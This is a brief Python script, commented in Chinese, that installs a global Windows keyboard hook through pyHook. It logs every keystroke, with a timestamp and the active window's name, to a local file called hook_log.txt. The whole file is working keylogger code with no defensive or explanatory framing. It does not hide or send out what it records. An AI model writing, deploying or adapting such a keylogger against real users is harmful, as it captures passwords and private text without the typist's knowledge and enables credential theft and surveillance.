#!/usr/bin/env python
# -*- coding: utf-8 -*-


import pythoncom
import pyHook
import time


def onKeyboardEvent(event):
    "处理键盘事件"
    fobj.writelines('-' * 20 + 'Keyboard Begin' + '-' * 20 + '\n')
    fobj.writelines("按键时间:%s\n" % time.strftime("%a, %d %b %Y %H:%M:%S", time.localtime()))
    fobj.writelines("操作窗口:%s\n" % str(event.WindowName))
    fobj.writelines("按键:%s\n" % str(event.Key))
    fobj.writelines('-' * 20 + 'Keyboard End' + '-' * 20 + '\n')
    return True


if __name__ == "__main__":

    # 打开日志文件
    file_name = "hook_log.txt"
    fobj = open(file_name, 'a')

    # 创建hook句柄
    hm = pyHook.HookManager()

    # 监控键盘
    hm.KeyDown = onKeyboardEvent
    hm.HookKeyboard()

    # 循环获取消息
    pythoncom.PumpMessages()

    # 关闭日志文件
    fobj.close()